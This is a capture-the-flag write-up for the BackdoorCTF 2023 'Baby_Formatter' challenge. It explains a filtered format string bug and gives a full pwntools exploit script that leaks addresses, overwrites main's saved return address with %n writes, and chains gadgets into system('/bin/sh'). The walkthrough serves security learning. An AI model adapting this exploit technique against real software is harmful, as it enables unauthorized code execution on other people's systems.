## Level: Easy

### Challenge

Get the binary, libc and loader from: https://github.com/sajjadium/ctf-archives/blob/main/ctfs/BackdoorCTF/2023/pwn/Baby_Formatter/README.md

Use `pwninit` or `patchelf` to patch the binary. 
```
  cp fmt1 fmt1_patched
  patchelf --set-interpreter ./ld-linux-x86-64.so.2 fmt1_patched
  patchelf --set-rpath . fmt1_patched
```

Cool challenge by __@p0ch1ta__, format string exploit with some filtered chars. This challenge made me realize that I should automate stuff with pwntools and python functions.

### Checksec
![checksec](https://github.com/user-attachments/assets/e040f7ec-3a06-41dd-a1b7-aa411c8d9fe5)

### Binary
Btw, they gave us an option to leak an address in libc and in the stack but I didn't take it :P

![noob](https://github.com/user-attachments/assets/7fc15592-e220-4227-aa85-c327c55cb772)

Anyway, `%p` `%u` `%d` and `%x` is filtered but we can still use `%s` and `%o` to leak info. Due to `Full RELRO` we can't overwrite the got entries, at least in the binary. Maybe we can overwrite a got entry in `libc` because its __Partial RELRO__ but I ended up overwriting _saved rip_ of main with **system("/bin/sh")**.

### Local Flag

![realflag](https://github.com/user-attachments/assets/67de5c3e-b633-4388-89b3-e5b102a40dad)

### Full Exploit
```
#!/usr/bin/env python3

from pwn import *
import time

context.arch = 'amd64'
'''
p = gdb.debug("./fmt1_patched", gdbscript="""
    b *main+159
    c
""")
'''

p = process("./fmt1_patched")

# leak an address in loader for gadgets
# the binary doesn't have useful gadgets
payload = b"%27$s"

p.recvuntil(b">> ")
p.sendline(b"2")

p.recvuntil(b">> ")
p.sendline(payload)

ld_leak = p.recvline().strip()

ld_leak = u64(ld_leak.ljust(8, b"\x00"))

ld_base = ld_leak - 242400
print("LD_BASE: " + hex(ld_base))

# useful gadgets
POP_RSP = ld_base + 0x00000000000021d3 
POP_RSI = ld_base + 0x00000000000054da
POP_RDI = ld_base + 0x000000000000351e 
RET = ld_base + 0x2128

# leak libc and stack addresses in octal
payload = b"%17$lo %21$lo %11$lo"

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
p.sendline(payload)

leak = p.recvline().strip()

# convert octal to int
libc_leak = int(leak[:16], 8)
stack_leak = int(leak[17:33], 8)

# calculate offsets
libc_base = libc_leak - 171408
ret_addr = stack_leak - 272
bin_sh = libc_base + 1934968 
system = libc_base + 331120

# overwrite the saved rip of main with "pop_rdi"
# split the address so copying is less painful (2 bytes each time instead of 4)
print("OVERWRITING saved rip with 'pop_rdi'...")
pop_rdi = hex(POP_RDI)[6:]
pop_rdi2 = hex(POP_RDI)[10:]
pop_rdi3 = pop_rdi[:4]

pop_rdi = int(pop_rdi, 16)
pop_rdi2 = int(pop_rdi2, 16)
pop_rdi3 = int(pop_rdi3, 16)

# copy the less significant 2 bytes
payload = b"%*9$c%8$hn"
payload += b"A"*6
payload += p64(ret_addr)
payload += p16(pop_rdi2)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.01)
p.sendline(payload)

# copy the next 2 bytes 
payload = b"%*9$c%8$hn"
payload += b"A"*6
payload += p64(ret_addr+2)
payload += p16(pop_rdi3)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.01)
p.sendline(payload)

# overwrite ret_addr+8 of main with "/bin/sh"
# to find "/bin/sh" string in libc (get the offsets with vmmap):
# find 0x00007ff799702000, 0x00007ff7998eb000, '/', 'b', 'i', 'n', '/', 's', 'h'
# copy the less significant 4 bytes
print("WRITING '/bin/sh' ONTO THE STACK...")
bin_sh1 = hex(bin_sh)[6:]
bin_sh1 = int(bin_sh1, 16)
payload = b"%*9$c%8$n"
payload += b"B" * 7
payload += p64(ret_addr+8)
payload += p32(bin_sh1)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.1)
p.sendline(payload)

# copy the higher 4 bytes
bin_sh2 = hex(bin_sh)[:6]
bin_sh2 = int(bin_sh2, 16)
payload = b"%*9$c%8$n"
payload += b"B" * 7
payload += p64(ret_addr+12)
payload += p32(bin_sh2)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.1)
p.sendline(payload)

# align the stack with "ret"
# copy the less significant 4 bytes
print("ALIGNING THE STACK FOR SYSTEM...")
ret1 = hex(RET)[6:]
ret1 = int(ret1, 16)
payload = b"%*9$c%8$n"
payload += b"C" * 7
payload += p64(ret_addr+16)
payload += p32(ret1)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.1)
p.sendline(payload)

# copy the higher 4 bytes
ret2 = hex(RET)[:6]
ret2 = int(ret2, 16)
payload = b"%*9$c%8$n"
payload += b"C" * 7
payload += p64(ret_addr+20)
payload += p32(ret2)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.1)
p.sendline(payload)

# call system
# copy the less significant 4 bytes
print("WRITING system('/bin/sh')...")
system1 = hex(system)[6:]
system1 = int(system1, 16)
payload = b"%*9$c%8$n"
payload += b"D" * 7
payload += p64(ret_addr+24)
payload += p32(system1)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.1)
p.sendline(payload)

# copy the higher 4 bytes
system1 = hex(system)[:6]
system1 = int(system1, 16)
payload = b"%*9$c%8$n"
payload += b"D" * 7
payload += p64(ret_addr+28)
payload += p32(system1)

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
time.sleep(0.1)
p.sendline(payload)

print("shell in 3...")
p.interactive()
```

See? That's why I said automating is important :D



